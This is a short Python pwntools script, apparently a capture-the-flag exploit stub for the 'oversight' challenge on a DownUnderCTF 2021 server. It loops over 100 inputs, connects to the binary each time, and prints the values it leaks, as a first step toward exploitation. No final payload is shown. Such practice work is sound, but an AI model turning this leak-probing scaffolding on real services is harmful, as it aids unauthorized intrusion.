#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from binascii import *
import time
import os

context.update(arch='amd64')
exe = './oversight'
HOST = 'pwn-2021.duc.tf'
PORT = 31909

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
b *wait+131
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================



for i in range(100):
    p = start()
    p.recvuntil(b"continue")
    p.send(b"1")
    p.recvuntil(b"number: ")
    p.sendline(str(i))
    leak = p.recvuntil(b")?").split(b'\n')[0].split()[-1]
    print(i)
    print(leak)
    
